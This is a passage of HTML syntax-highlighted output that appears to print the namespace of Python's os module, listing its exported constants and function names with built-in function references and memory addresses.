class="string">&#x27;MFD_HUGE_512KB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_512MB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_64KB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_8MB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_MASK&#x27;</span>, <span class="string">&#x27;MFD_HUGE_SHIFT&#x27;</span>, <span class="string">&#x27;NGROUPS_MAX&#x27;</span>, <span class="string">&#x27;O_ACCMODE&#x27;</span>, <span class="string">&#x27;O_APPEND&#x27;</span>, <span class="string">&#x27;O_ASYNC&#x27;</span>, <span class="string">&#x27;O_CLOEXEC&#x27;</span>, <span class="string">&#x27;O_CREAT&#x27;</span>, <span class="string">&#x27;O_DIRECT&#x27;</span>, <span class="string">&#x27;O_DIRECTORY&#x27;</span>, <span class="string">&#x27;O_DSYNC&#x27;</span>, <span class="string">&#x27;O_EXCL&#x27;</span>, <span class="string">&#x27;O_LARGEFILE&#x27;</span>, <span class="string">&#x27;O_NDELAY&#x27;</span>, <span class="string">&#x27;O_NOATIME&#x27;</span>, <span class="string">&#x27;O_NOCTTY&#x27;</span>, <span class="string">&#x27;O_NOFOLLOW&#x27;</span>, <span class="string">&#x27;O_NONBLOCK&#x27;</span>, <span class="string">&#x27;O_PATH&#x27;</span>, <span class="string">&#x27;O_RDONLY&#x27;</span>, <span class="string">&#x27;O_RDWR&#x27;</span>, <span class="string">&#x27;O_RSYNC&#x27;</span>, <span class="string">&#x27;O_SYNC&#x27;</span>, <span class="string">&#x27;O_TMPFILE&#x27;</span>, <span class="string">&#x27;O_TRUNC&#x27;</span>, <span class="string">&#x27;O_WRONLY&#x27;</span>, <span class="string">&#x27;POSIX_FADV_DONTNEED&#x27;</span>, <span class="string">&#x27;POSIX_FADV_NOREUSE&#x27;</span>, <span class="string">&#x27;POSIX_FADV_NORMAL&#x27;</span>, <span class="string">&#x27;POSIX_FADV_RANDOM&#x27;</span>, <span class="string">&#x27;POSIX_FADV_SEQUENTIAL&#x27;</span>, <span class="string">&#x27;POSIX_FADV_WILLNEED&#x27;</span>, <span class="string">&#x27;POSIX_SPAWN_CLOSE&#x27;</span>, <span class="string">&#x27;POSIX_SPAWN_DUP2&#x27;</span>, <span class="string">&#x27;POSIX_SPAWN_OPEN&#x27;</span>, <span class="string">&#x27;PRIO_PGRP&#x27;</span>, <span class="string">&#x27;PRIO_PROCESS&#x27;</span>, <span class="string">&#x27;PRIO_USER&#x27;</span>, <span class="string">&#x27;P_ALL&#x27;</span>, <span class="string">&#x27;P_PGID&#x27;</span>, <span class="string">&#x27;P_PID&#x27;</span>, <span class="string">&#x27;P_PIDFD&#x27;</span>, <span class="string">&#x27;RTLD_DEEPBIND&#x27;</span>, <span class="string">&#x27;RTLD_GLOBAL&#x27;</span>, <span class="string">&#x27;RTLD_LAZY&#x27;</span>, <span class="string">&#x27;RTLD_LOCAL&#x27;</span>, <span class="string">&#x27;RTLD_NODELETE&#x27;</span>, <span class="string">&#x27;RTLD_NOLOAD&#x27;</span>, <span class="string">&#x27;RTLD_NOW&#x27;</span>, <span class="string">&#x27;RWF_DSYNC&#x27;</span>, <span class="string">&#x27;RWF_HIPRI&#x27;</span>, <span class="string">&#x27;RWF_NOWAIT&#x27;</span>, <span class="string">&#x27;RWF_SYNC&#x27;</span>, <span class="string">&#x27;R_OK&#x27;</span>, <span class="string">&#x27;SCHED_BATCH&#x27;</span>, <span class="string">&#x27;SCHED_FIFO&#x27;</span>, <span class="string">&#x27;SCHED_IDLE&#x27;</span>, <span class="string">&#x27;SCHED_OTHER&#x27;</span>, <span class="string">&#x27;SCHED_RESET_ON_FORK&#x27;</span>, <span class="string">&#x27;SCHED_RR&#x27;</span>, <span class="string">&#x27;SEEK_DATA&#x27;</span>, <span class="string">&#x27;SEEK_HOLE&#x27;</span>, <span class="string">&#x27;ST_APPEND&#x27;</span>, <span class="string">&#x27;ST_MANDLOCK&#x27;</span>, <span class="string">&#x27;ST_NOATIME&#x27;</span>, <span class="string">&#x27;ST_NODEV&#x27;</span>, <span class="string">&#x27;ST_NODIRATIME&#x27;</span>, <span class="string">&#x27;ST_NOEXEC&#x27;</span>, <span class="string">&#x27;ST_NOSUID&#x27;</span>, <span class="string">&#x27;ST_RDONLY&#x27;</span>, <span class="string">&#x27;ST_RELATIME&#x27;</span>, <span class="string">&#x27;ST_SYNCHRONOUS&#x27;</span>, <span class="string">&#x27;ST_WRITE&#x27;</span>, <span class="string">&#x27;TMP_MAX&#x27;</span>, <span class="string">&#x27;WCONTINUED&#x27;</span>, <span class="string">&#x27;WCOREDUMP&#x27;</span>, <span class="string">&#x27;WEXITED&#x27;</span>, <span class="string">&#x27;WEXITSTATUS&#x27;</span>, <span class="string">&#x27;WIFCONTINUED&#x27;</span>, <span class="string">&#x27;WIFEXITED&#x27;</span>, <span class="string">&#x27;WIFSIGNALED&#x27;</span>, <span class="string">&#x27;WIFSTOPPED&#x27;</span>, <span class="string">&#x27;WNOHANG&#x27;</span>, <span class="string">&#x27;WNOWAIT&#x27;</span>, <span class="string">&#x27;WSTOPPED&#x27;</span>, <span class="string">&#x27;WSTOPSIG&#x27;</span>, <span class="string">&#x27;WTERMSIG&#x27;</span>, <span class="string">&#x27;WUNTRACED&#x27;</span>, <span class="string">&#x27;W_OK&#x27;</span>, <span class="string">&#x27;XATTR_CREATE&#x27;</span>, <span class="string">&#x27;XATTR_REPLACE&#x27;</span>, <span class="string">&#x27;XATTR_SIZE_MAX&#x27;</span>, <span class="string">&#x27;X_OK&#x27;</span>, <span class="string">&#x27;abort&#x27;</span>, <span class="string">&#x27;access&#x27;</span>, <span class="string">&#x27;chdir&#x27;</span>, <span class="string">&#x27;chmod&#x27;</span>, <span class="string">&#x27;chown&#x27;</span>, <span class="string">&#x27;chroot&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;closerange&#x27;</span>, <span class="string">&#x27;confstr&#x27;</span>, <span class="string">&#x27;confstr_names&#x27;</span>, <span class="string">&#x27;copy_file_range&#x27;</span>, <span class="string">&#x27;cpu_count&#x27;</span>, <span class="string">&#x27;ctermid&#x27;</span>, <span class="string">&#x27;device_encoding&#x27;</span>, <span class="string">&#x27;dup&#x27;</span>, <span class="string">&#x27;dup2&#x27;</span>, <span class="string">&#x27;environ&#x27;</span>, <span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;execv&#x27;</span>, <span class="string">&#x27;execve&#x27;</span>, <span class="string">&#x27;fchdir&#x27;</span>, <span class="string">&#x27;fchmod&#x27;</span>, <span class="string">&#x27;fchown&#x27;</span>, <span class="string">&#x27;fdatasync&#x27;</span>, <span class="string">&#x27;fork&#x27;</span>, <span class="string">&#x27;forkpty&#x27;</span>, <span class="string">&#x27;fpathconf&#x27;</span>, <span class="string">&#x27;fspath&#x27;</span>, <span class="string">&#x27;fstat&#x27;</span>, <span class="string">&#x27;fstatvfs&#x27;</span>, <span class="string">&#x27;fsync&#x27;</span>, <span class="string">&#x27;ftruncate&#x27;</span>, <span class="string">&#x27;get_blocking&#x27;</span>, <span class="string">&#x27;get_inheritable&#x27;</span>, <span class="string">&#x27;get_terminal_size&#x27;</span>, <span class="string">&#x27;getcwd&#x27;</span>, <span class="string">&#x27;getcwdb&#x27;</span>, <span class="string">&#x27;getegid&#x27;</span>, <span class="string">&#x27;geteuid&#x27;</span>, <span class="string">&#x27;getgid&#x27;</span>, <span class="string">&#x27;getgrouplist&#x27;</span>, <span class="string">&#x27;getgroups&#x27;</span>, <span class="string">&#x27;getloadavg&#x27;</span>, <span class="string">&#x27;getlogin&#x27;</span>, <span class="string">&#x27;getpgid&#x27;</span>, <span class="string">&#x27;getpgrp&#x27;</span>, <span class="string">&#x27;getpid&#x27;</span>, <span class="string">&#x27;getppid&#x27;</span>, <span class="string">&#x27;getpriority&#x27;</span>, <span class="string">&#x27;getrandom&#x27;</span>, <span class="string">&#x27;getresgid&#x27;</span>, <span class="string">&#x27;getresuid&#x27;</span>, <span class="string">&#x27;getsid&#x27;</span>, <span class="string">&#x27;getuid&#x27;</span>, <span class="string">&#x27;getxattr&#x27;</span>, <span class="string">&#x27;initgroups&#x27;</span>, <span class="string">&#x27;isatty&#x27;</span>, <span class="string">&#x27;kill&#x27;</span>, <span class="string">&#x27;killpg&#x27;</span>, <span class="string">&#x27;lchown&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;listdir&#x27;</span>, <span class="string">&#x27;listxattr&#x27;</span>, <span class="string">&#x27;lockf&#x27;</span>, <span class="string">&#x27;lseek&#x27;</span>, <span class="string">&#x27;lstat&#x27;</span>, <span class="string">&#x27;major&#x27;</span>, <span class="string">&#x27;makedev&#x27;</span>, <span class="string">&#x27;memfd_create&#x27;</span>, <span class="string">&#x27;minor&#x27;</span>, <span class="string">&#x27;mkdir&#x27;</span>, <span class="string">&#x27;mkfifo&#x27;</span>, <span class="string">&#x27;mknod&#x27;</span>, <span class="string">&#x27;nice&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;openpty&#x27;</span>, <span class="string">&#x27;pathconf&#x27;</span>, <span class="string">&#x27;pathconf_names&#x27;</span>, <span class="string">&#x27;pidfd_open&#x27;</span>, <span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;pipe2&#x27;</span>, <span class="string">&#x27;posix_fadvise&#x27;</span>, <span class="string">&#x27;posix_fallocate&#x27;</span>, <span class="string">&#x27;posix_spawn&#x27;</span>, <span class="string">&#x27;posix_spawnp&#x27;</span>, <span class="string">&#x27;pread&#x27;</span>, <span class="string">&#x27;preadv&#x27;</span>, <span class="string">&#x27;putenv&#x27;</span>, <span class="string">&#x27;pwrite&#x27;</span>, <span class="string">&#x27;pwritev&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;readlink&#x27;</span>, <span class="string">&#x27;readv&#x27;</span>, <span class="string">&#x27;register_at_fork&#x27;</span>, <span class="string">&#x27;remove&#x27;</span>, <span class="string">&#x27;removexattr&#x27;</span>, <span class="string">&#x27;rename&#x27;</span>, <span class="string">&#x27;replace&#x27;</span>, <span class="string">&#x27;rmdir&#x27;</span>, <span class="string">&#x27;scandir&#x27;</span>, <span class="string">&#x27;sched_get_priority_max&#x27;</span>, <span class="string">&#x27;sched_get_priority_min&#x27;</span>, <span class="string">&#x27;sched_getaffinity&#x27;</span>, <span class="string">&#x27;sched_getparam&#x27;</span>, <span class="string">&#x27;sched_getscheduler&#x27;</span>, <span class="string">&#x27;sched_param&#x27;</span>, <span class="string">&#x27;sched_rr_get_interval&#x27;</span>, <span class="string">&#x27;sched_setaffinity&#x27;</span>, <span class="string">&#x27;sched_setparam&#x27;</span>, <span class="string">&#x27;sched_setscheduler&#x27;</span>, <span class="string">&#x27;sched_yield&#x27;</span>, <span class="string">&#x27;sendfile&#x27;</span>, <span class="string">&#x27;set_blocking&#x27;</span>, <span class="string">&#x27;set_inheritable&#x27;</span>, <span class="string">&#x27;setegid&#x27;</span>, <span class="string">&#x27;seteuid&#x27;</span>, <span class="string">&#x27;setgid&#x27;</span>, <span class="string">&#x27;setgroups&#x27;</span>, <span class="string">&#x27;setpgid&#x27;</span>, <span class="string">&#x27;setpgrp&#x27;</span>, <span class="string">&#x27;setpriority&#x27;</span>, <span class="string">&#x27;setregid&#x27;</span>, <span class="string">&#x27;setresgid&#x27;</span>, <span class="string">&#x27;setresuid&#x27;</span>, <span class="string">&#x27;setreuid&#x27;</span>, <span class="string">&#x27;setsid&#x27;</span>, <span class="string">&#x27;setuid&#x27;</span>, <span class="string">&#x27;setxattr&#x27;</span>, <span class="string">&#x27;stat&#x27;</span>, <span class="string">&#x27;stat_result&#x27;</span>, <span class="string">&#x27;statvfs&#x27;</span>, <span class="string">&#x27;statvfs_result&#x27;</span>, <span class="string">&#x27;strerror&#x27;</span>, <span class="string">&#x27;symlink&#x27;</span>, <span class="string">&#x27;sync&#x27;</span>, <span class="string">&#x27;sysconf&#x27;</span>, <span class="string">&#x27;sysconf_names&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;tcgetpgrp&#x27;</span>, <span class="string">&#x27;tcsetpgrp&#x27;</span>, <span class="string">&#x27;terminal_size&#x27;</span>, <span class="string">&#x27;times&#x27;</span>, <span class="string">&#x27;times_result&#x27;</span>, <span class="string">&#x27;truncate&#x27;</span>, <span class="string">&#x27;ttyname&#x27;</span>, <span class="string">&#x27;umask&#x27;</span>, <span class="string">&#x27;uname&#x27;</span>, <span class="string">&#x27;uname_result&#x27;</span>, <span class="string">&#x27;unlink&#x27;</span>, <span class="string">&#x27;unsetenv&#x27;</span>, <span class="string">&#x27;urandom&#x27;</span>, <span class="string">&#x27;utime&#x27;</span>, <span class="string">&#x27;wait&#x27;</span>, <span class="string">&#x27;wait3&#x27;</span>, <span class="string">&#x27;wait4&#x27;</span>, <span class="string">&#x27;waitid&#x27;</span>, <span class="string">&#x27;waitid_result&#x27;</span>, <span class="string">&#x27;waitpid&#x27;</span>, <span class="string">&#x27;waitstatus_to_exitcode&#x27;</span>, <span class="string">&#x27;write&#x27;</span>, <span class="string">&#x27;writev&#x27;</span>, <span class="string">&#x27;makedirs&#x27;</span>, <span class="string">&#x27;removedirs&#x27;</span>, <span class="string">&#x27;renames&#x27;</span>, <span class="string">&#x27;walk&#x27;</span>, <span class="string">&#x27;fwalk&#x27;</span>, <span class="string">&#x27;execl&#x27;</span>, <span class="string">&#x27;execle&#x27;</span>, <span class="string">&#x27;execlp&#x27;</span>, <span class="string">&#x27;execlpe&#x27;</span>, <span class="string">&#x27;execvp&#x27;</span>, <span class="string">&#x27;execvpe&#x27;</span>, <span class="string">&#x27;getenv&#x27;</span>, <span class="string">&#x27;supports_bytes_environ&#x27;</span>, <span class="string">&#x27;environb&#x27;</span>, <span class="string">&#x27;getenvb&#x27;</span>, <span class="string">&#x27;P_WAIT&#x27;</span>, <span class="string">&#x27;P_NOWAIT&#x27;</span>, <span class="string">&#x27;P_NOWAITO&#x27;</span>, <span class="string">&#x27;spawnv&#x27;</span>, <span class="string">&#x27;spawnve&#x27;</span>, <span class="string">&#x27;spawnvp&#x27;</span>, <span class="string">&#x27;spawnvpe&#x27;</span>, <span class="string">&#x27;spawnl&#x27;</span>, <span class="string">&#x27;spawnle&#x27;</span>, <span class="string">&#x27;spawnlp&#x27;</span>, <span class="string">&#x27;spawnlpe&#x27;</span>], <span class="string">&#x27;_exists&#x27;</span>: &lt;function _exists at <span class="number">0x7fc7ef5478b0</span>&gt;, <span class="string">&#x27;_get_exports_list&#x27;</span>: &lt;function _get_exports_list at <span class="number">0x7fc7ef547ca0</span>&gt;, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;linesep&#x27;</span>: <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;stat&#x27;</span>: &lt;built-<span class="keyword">in</span> function stat&gt;, <span class="string">&#x27;access&#x27;</span>: &lt;built-<span class="keyword">in</span> function access&gt;, <span class="string">&#x27;ttyname&#x27;</span>: &lt;built-<span class="keyword">in</span> function ttyname&gt;, <span class="string">&#x27;chdir&#x27;</span>: &lt;built-<span class="keyword">in</span> function chdir&gt;, <span class="string">&#x27;chmod&#x27;</span>: &lt;built-<span class="keyword">in</span> function chmod&gt;, <span class="string">&#x27;fchmod&#x27;</span>: &lt;built-<span class="keyword">in</span> function fchmod&gt;, <span class="string">&#x27;chown&#x27;</span>: &lt;built-<span class="keyword">in</span> function chown&gt;, <span class="string">&#x27;fchown&#x27;</span>: &lt;built-<span class="keyword">in</span> function fchown&gt;, <span class="string">&#x27;lchown&#x27;</span>: &lt;built-<span class="keyword">in</span> function lchown&gt;, <span class="string">&#x27;chroot&#x27;</span>: &lt;built-<span class="keyword">in</span> function chroot&gt;, <span class="string">&#x27;ctermid&#x27;</span>: &lt;built-<span class="keyword">in</span> function ctermid&gt;, <span class="string">&#x27;getcwd&#x27;</span>: &lt;built-<span class="keyword">in</span> function getcwd&gt;, <span class="string">&#x27;getcwdb&#x27;</span>: &lt;built-<span class="keyword">in</span> function getcwdb&gt;, <span class="string">&#x27;link&#x27;</span>: &lt;built-<span class="keyword">in</span> function link&gt;, <span class="string">&#x27;listdir&#x27;</span>: &lt;built-<span class="keyword">in</span> function listdir&gt;, <span class="string">&#x27;lstat&#x27;</span>: &lt;built-<span class="keyword">in</span> function lstat&gt;, <span class="string">&#x27;mkdir&#x27;</span>: &lt;built-<span class="keyword">in</span> function mkdir&gt;, <span class="string">&#x27;nice&#x27;</span>: &lt;built-<span class="keyword">in</span> function nice&gt;, <span class="string">&#x27;getpriority&#x27;</span>: &lt;built-<span class="keyword">in</span> function getpriority&gt;, <span class="string">&#x27;setpriority&#x27;</span>: &lt;built-<span class="keyword">in</span> function setpriority&gt;, <span class="string">&#x27;posix_spawn&#x27;</span>: &lt;built-<span class="keyword">in</span> function posix_spawn&gt;, <span class="string">&#x27;posix_spawnp&#x27;</span>: &lt;built-<span class="keyword">in</span> function posix_spawnp&gt;, <span class="string">&#x27;readlink&#x27;</span>: &lt;built-<span class="keyword">in</span> function readlink&gt;, <span class="string">&#x27;copy_file_range&#x27;</span>: &lt;built-<span class="keyword">in</span> function copy_file_range&gt;, <span class="string">&#x27;rename&#x27;</span>: &lt;built-<span class="keyword">in</span> function rename&gt;, <span class="string">&#x27;replace&#x27;</span>: &lt;built-<span class="keyword">in</span> function replace&gt;, <span class="string">&#x27;rmdir&#x27;</span>: &lt;built-<span class="keyword">in</span> function rmdir&gt;, <span class="string">&#x27;symlink&#x27;</span>: &lt;built-<span class="keyword">in</span> function symlink&gt;, <span class="string">&#x27;system&#x27;</span>: &lt;built-<span class="keyword">in</span> function system&gt;, <span class="string">&#x27;umask&#x27;</span>: &lt;built-<span class="keyword">in</span> function umask&gt;, <span class="string">&#x27;uname&#x27;</span>: &lt;built-<span class="keyword">in</span> function uname&gt;, <span class="string">&#x27;unlink&#x27;</span>: &lt;built-<span class="keyword">in</span> function unlink&gt;, <span class="string">&#x27;remove&#x27;</span>: &lt;built-<span class="keyword">in</span> function remove&gt;, <span class="string">&#x27;utime&#x27;</span>: &lt;built-<span class="keyword">in</span> function utime&gt;, <span class="string">&#x27;times&#x27;</span>: &lt;built-<span class="keyword">in</span> function times&gt;, <span class="string">&#x27;execv&#x27;</span>: &lt;built-<span class="keyword">in</span> function execv&gt;, <span class="string">&#x27;execve&#x27;</span>: &lt;built-<span class="keyword">in</span> function execve&gt;, <span class="string">&#x27;fork&#x27;</span>: &lt;built-<span class="keyword">in</span> function fork&gt;, <span class="string">&#x27;register_at_fork&#x27;</span>: &lt;built-<span class="keyword">in</span> function register_at_fork&gt;, <span class="string">&#x27;sched_get_priority_max&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_get_priority_max&gt;, <span class="string">&#x27;sched_get_priority_min&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_get_priority_min&gt;, <span class="string">&#x27;sched_getparam&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_getparam&gt;, <span class="string">&#x27;sched_getscheduler&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_getscheduler&gt;, <span class="string">&#x27;sched_rr_get_interval&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_rr_get_interval&gt;, <span class="string">&#x27;sched_setparam&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_setparam&gt;, <span class="string">&#x27;sched_setscheduler&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_setscheduler&gt;, <span class="string">&#x27;sched_yield&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_yield&gt;, <span class="string">&#x27;sched_setaffinity&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_setaffinity&gt;, <span class="string">&#x27;sched_getaffinity&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_getaffinity&gt;, <span class="string">&#x27;openpty&#x27;</span>: &lt;built-<span class="keyword">in</span> function openpty&gt;, <span class="string">&#x27;forkpty&#x27;</span>: &lt;built-<span class="keyword">in</span> function forkpty&gt;, <span class="string">&#x27;getegid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getegid&gt;, <span class="string">&#x27;geteuid&#x27;</span>: &lt;built-<span class="keyword">in</span> function geteuid&gt;, <span class="string">&#x27;getgid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getgid&gt;, <span class="string">&#x27;getgrouplist&#x27;</span>: &lt;built-<span class="keyword">in</span> function getgrouplist&gt;, <span class="string">&#x27;getgroups&#x27;</span>: &lt;built-<span class="keyword">in</span> function getgroups&gt;, <span class="string">&#x27;getpid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getpid&gt;, <span class="string">&#x27;getpgrp&#x27;</span>: &lt;built-<span class="keyword">in</span> function getpgrp&gt;, <span class="string">&#x27;getppid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getppid&gt;, <span class="string">&#x27;getuid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getuid&gt;, <span class="string">&#x27;getlogin&#x27;</span>: &lt;built-<span class="keyword">in</span> function getlogin&gt;, <span class="string">&#x27;kill&#x27;</span>: &lt;built-<span class="keyword">in</span> function kill&gt;, <span class="string">&#x27;killpg&#x27;</span>: &lt;built-<span class="keyword">in</span> function killpg&gt;, <span class="string">&#x27;setuid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setuid&gt;, <span class="string">&#x27;seteuid&#x27;</span>: &lt;built-<span class="keyword">in</span> function seteuid&gt;, <span class="string">&#x27;setreuid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setreuid&gt;, <span class="string">&#x27;setgid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setgid&gt;, <span class="string">&#x27;setegid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setegid&gt;, <span class="string">&#x27;setregid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setregid&gt;, <span class="string">&#x27;setgroups&#x27;</span>: &lt;built-<span class="keyword">in</span> function setgroups&gt;, <span class="string">&#x27;initgroups&#x27;</span>: &lt;built-<span class="keyword">in</span> function initgroups&gt;, <span class="string">&#x27;getpgid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getpgid&gt;, <span class="string">&#x27;setpgrp&#x27;</span>: &lt;built-<span class="keyword">in</span> function setpgrp&gt;, <span class="string">&#x27;wait&#x27;</span>: &lt;built-<span class="keyword">in</span> function wait&gt;, <span class="string">&#x27;wait3&#x27;</span>: &lt;built-<span class="keyword">in</span> function wait3&gt;, <span class="string">&#x27;wait4&#x27;</span>: &lt;built-<span class="keyword">in</span> function wait4&gt;, <span class="string">&#x27;waitid&#x27;</span>: &lt;built-<span class="keyword">in</span> function waitid&gt;, <span class="string">&#x27;waitpid&#x27;</span>: &lt;built-<span class="keyword">in</span> function waitpid&gt;, <span class="string">&#x27;pidfd_open&#x27;</span>: &lt;built-<span class="keyword">in</span> function pidfd_open&gt;, <span class="string">&#x27;getsid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getsid&gt;, <span class="string">&#x27;setsid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setsid&gt;, <span class="string">&#x27;setpgid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setpgid&gt;, <span class="string">&#x27;tcgetpgrp&#x27;</span>: &lt;built-<span class="keyword">in</span> function tcgetpgrp&gt;, <span class="string">&#x27;tcsetpgrp&#x27;</span>: &lt;built-<span class="keyword">in</span> function tcsetpgrp&gt;, <span class="string">&#x27;open&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">open</span>&gt;, <span class="string">&#x27;close&#x27;</span>: &lt;built-<span class="keyword">in</span> function close&gt;, <span class="string">&#x27;closerange&#x27;</span>: &lt;built-<span class="keyword">in</span> function closerange&gt;, <span class="string">&#x27;device_encoding&#x27;</span>: &lt;built-<span class="keyword">in</span> function device_encoding&gt;, <span class="string">&#x27;dup&#x27;</span>: &lt;built-<span class="keyword">in</span> function dup&gt;, <span class="string">&#x27;dup2&#x27;</span>: &lt;built-<span class="keyword">in</span> function dup2&gt;, <span class="string">&#x27;lockf&#x27;</span>: &lt;built-<span class="keyword">in</span> function lockf&gt;, <span class="string">&#x27;lseek&#x27;</span>: &lt;built-<span class="keyword">in</span> function lseek&gt;, <span class="string">&#x27;read&#x27;</span>: &lt;built-<span class="keyword">in</span> function read&gt;, <span class="string">&#x27;readv&#x27;</span>: &lt;built-<span class="keyword">in</span> function readv&gt;, <span class="string">&#x27;pread&#x27;</span>: &lt;built-<span class="keyword">in</span> function pread&gt;, <span class="string">&#x27;preadv&#x27;</span>: &lt;built-<span class="keyword">in</span> function preadv&gt;, <span class="string">&#x27;write&#x27;</span>: &lt;built-<span class="keyword">in</span> function write&gt;, <span class="string">&#x27;writev&#x27;</span>: &lt;built-<span class="keyword">in</span> function writev&gt;, <span class="string">&#x27;pwrite&#x27;</span>: &lt;built-<span class="keyword">in</span> function pwrite&gt;, <span class="string">&#x27;pwritev&#x27;</span>: &lt;built-<span class="keyword">in</span> function pwritev&gt;, <span class="string">&#x27;sendfile&#x27;</span>: &lt;built-<span class="keyword">in</span> function sendfile&gt;, <span class="string">&#x27;fstat&#x27;</span>: &lt;built-<span class="keyword">in</span> function fstat&gt;, <span class="string">&#x27;isatty&#x27;</span>: &lt;built-<span class="keyword">in</span> function isatty&gt;, <span class="string">&#x27;pipe&#x27;</span>: &lt;built-<span class="keyword">in</span> function pipe&gt;, <span class="string">&#x27;pipe2&#x27;</span>: &lt;built-<span class="keyword">in</span> function pipe2&gt;, <span class="string">&#x27;mkfifo&#x27;</span>: &lt;built-<span class="keyword">in</span> function mkfifo&gt;, <span class="string">&#x27;mknod&#x27;</span>: &lt;built-<span class="keyword">in</span> function mknod&gt;, <span class="string">&#x27;major&#x27;</span>: &lt;built-<span class="keyword">in</span> function major&gt;, <span class="string">&#x27;minor&#x27;</span>: &lt;built-<span class="keyword">in</span> function minor&gt;, <span class="string">&#x27;makedev&#x27;</span>: &lt;built-<span class="keyword">in</span> function makedev&gt;, <span class="string">&#x27;ftruncate&#x27;</span>: &lt;built-<span class="keyword">in</span> function ftruncate&gt;, <span class="string">&#x27;truncate&#x27;</span>: &lt;built-<span class="keyword">in</span> function truncate&gt;, <span class="string">&#x27;posix_fallocate&#x27;</span>: &lt;built-<span class="keyword">in</span> function posix_fallocate&gt;, <span class="string">&#x27;posix_fadvise&#x27;</span>: &lt;built-<span class="keyword">in</span> function posix_fadvise&gt;, <span class="string">&#x27;putenv&#x27;</span>: &lt;built-<span class="keyword">in</span> function putenv&gt;, <span class="string">&#x27;unsetenv&#x27;</span>: &lt;built-<span class="keyword">in</span> function unsetenv&gt;, <span class="string">&#x27;strerror&#x27;</span>: &lt;built-<span class="keyword">in</span> function strerror&gt;, <span class="string">&#x27;fchdir&#x27;</span>: &lt;built-<span class="keyword">in</span> function fchdir&gt;, <span class="string">&#x27;fsync&#x27;</span>: &lt;built-<span class="keyword">in</span> function fsync&gt;, <span class="string">&#x27;sync&#x27;</span>: &lt;built-<span class="keyword">in</span> function sync&gt;, <span class="string">&#x27;fdatasync&#x27;</span>: &lt;built-<span class="keyword">in</span> function fdatasync&gt;, <span class="string">&#x27;WCOREDUMP&#x27;</span>: &lt;built-<span class="keyword">in</span> function WCOREDUMP&gt;, <span class="string">&#x27;WIFCONTINUED&#x27;</span>: &lt;built-<span class="keyword">in</span> function WIFCONTINUED&gt;, <span class="string">&#x27;WIFSTOPPED&#x27;</span>: &lt;built-<span class="keyword">in</span> function WIFSTOPPED&gt;, <span class="string">&#x27;WIFSIGNALED&#x27;</span>: &lt;built-<span class="keyword">in</span> function WIFSIGNALED&gt;, <span class="string">&#x27;WIFEXITED&#x27;</span>: &lt;built-<span class="keyword">in</span> function WIFEXITED&gt;, <span class="string">&#x27;WEXITSTATUS&#x27;</span>: &lt;built-<span class="keyword">in</span> function WEXITSTATUS&gt;, <span class="string">&#x27;WTERMSIG&#x27;</span>: &lt;built-<span class="keyword">in</span> function WTERMSIG&gt;, <span class="string">&#x27;WSTOPSIG&#x27;</span>: &lt;built-<span class="keyword">in</span> function WSTOPSIG&gt;, <span class="string">&#x27;fstatvfs&#x27;</span>: &lt;built-<span class="keyword">in</span> function fstatvfs&gt;, <span class="string">&#x27;statvfs&#x27;</span>: &lt;built-<span class="keyword">in</span> function statvfs&gt;, <span class="string">&#x27;confstr&#x27;</span>: &lt;built-<span class="keyword">in</span> function confstr&gt;, <span class="string">&#x27;sysconf&#x27;</span>: &lt;built-<span class="keyword">in</span> function sysconf&gt;, <span class="string">&#x27;fpathconf&#x27;</span>: &lt;built-<span class="keyword">in</span> function fpathconf&gt;, <span class="string">&#x27;pathconf&#x27;</span>: &lt;built-<span class="keyword">in</span> function pathconf&gt;, <span class="string">&#x27;abort&#x27;</span>: &lt;built-<span class="keyword">in</span> function abort&gt;, <span class="string">&#x27;getloadavg&#x27;</span>: &lt;built-<span class="keyword">in</span> function getloadavg&gt;, <span class="string">&#x27;urandom&#x27;</span>: &lt;built-<span class="keyword">in</span> function urandom&gt;, <span class="string">&#x27;setresuid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setresuid&gt;, <span class="string">&#x27;setresgid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setresgid&gt;, <span class="string">&#x27;getresuid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getresuid&gt;, <span class="string">&#x27;getresgid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getresgid&gt;, <span class="string">&#x27;getxattr&#x27;</span>: &lt;built-<span class="keyword">in</span> function getxattr&gt;, <span class="string">&#x27;setxattr&#x27;</span>: &lt;built-<span class="keyword">in</span> function setxattr&gt;, <span 